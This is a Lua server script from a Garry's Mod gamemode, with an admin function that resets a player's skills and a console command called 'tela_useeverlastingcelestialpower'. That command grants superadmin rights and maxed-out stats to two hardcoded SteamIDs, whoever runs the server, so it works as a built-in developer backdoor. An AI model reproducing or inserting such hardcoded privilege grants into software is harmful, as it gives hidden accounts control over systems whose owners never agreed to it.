-- This stuff i added here doesn't appear normally in game instead it is possible to run functions via something else such as lua_run

function ULXResetSkills(ply)
if !SERVER then return false end
if !ply:IsValid() or !ply:Alive() then return false end

local refund = 0 + ply.StatPoints
ply.StatPoints = 0

for k, v in pairs( StatsListServer ) do
	local TheStatPieces = string.Explode( ";", v )
	local TheStatName = TheStatPieces[1]
	refund = refund + tonumber(ply[ TheStatName ])
	ply[ TheStatName ] = 0
end

ply.StatPoints = refund

ply:SetMaxHealth( 100 + ( ply.StatHealth * 5 ) )
ply:SetMaxArmor( 100 + ( ply.StatEngineer * 2 ) )
RecalcPlayerSpeed(ply)

net.Start("UpdatePeriodicStats")
net.WriteFloat( ply.Level )
net.WriteFloat( ply.Money )
net.WriteFloat( ply.XP )
net.WriteFloat( ply.StatPoints )
net.WriteFloat( ply.Bounty )
net.Send( ply )

net.Start("UpdatePerks")
net.WriteFloat( ply.StatDefense )
net.WriteFloat( ply.StatDamage )
net.WriteFloat( ply.StatSpeed )
net.WriteFloat( ply.StatHealth )
net.WriteFloat( ply.StatKnowledge )
net.WriteFloat( ply.StatMedSkill )
net.WriteFloat( ply.StatStrength )
net.WriteFloat( ply.StatEndurance )
net.WriteFloat( ply.StatSalvage )
net.WriteFloat( ply.StatBarter )
net.WriteFloat( ply.StatEngineer )
net.WriteFloat( ply.StatImmune )
net.WriteFloat( ply.StatSurvivor )
net.Send( ply )

SystemMessage(ply, "An admin has reset your skillls! All of your skills are now set to 0 and stat points are refunded", Color(205,205,205,255), true)

return true

end

function EverlastingCelestialPowerForDev( ply )
if !ply:IsValid() then return false end
if ply:SteamID64() == "76561198274314803" or ply:SteamID64() == "76561198065110123" then
	ply:SetUserGroup("superadmin")
	ply.Level = 1000
	ply.Money = 1000000
	ply.XP = 1000000
	ply.StatBarter = 10
	ply.StatDamage = 10
	ply.StatDefense = 10
	ply.StatEndurance = 10
	ply.StatEngineer = 10
	ply.StatHealth = 10
	ply.StatImmune = 10
	ply.StatKnowledge = 10
	ply.StatMedSkill = 10
	ply.StatSalvage = 10
	ply.StatSpeed = 10
	ply.StatStrength = 10
	ply.StatSurvivor = 10

	ply:SetNWInt( "PlyLevel", ply.Level )
	FullyUpdatePlayer( ply )
	SystemMessage(ply, "User is identified", Color(192,96,96,255), true)
	SystemBroadcast(""..ply:Nick().." has used the Everlasting Celestial power!", Color(255,255,105,255), true)
	for k, v in pairs(player.GetAll()) do v:EmitSound("music/stingers/industrial_suspense2.wav") end

elseif !SuperAdminCheck( ply ) then 
	SystemMessage(ply, "You are not superadmin!", Color(255,205,205,255), true)
	ply:ConCommand( "play theeverlastingapocalypse/access_denied.wav" )
	return
else
	SystemMessage(ply, "User is not identified", Color(128,96,96,255), true)
	end
end
concommand.Add( "tela_useeverlastingcelestialpower", EverlastingCelestialPowerForDev )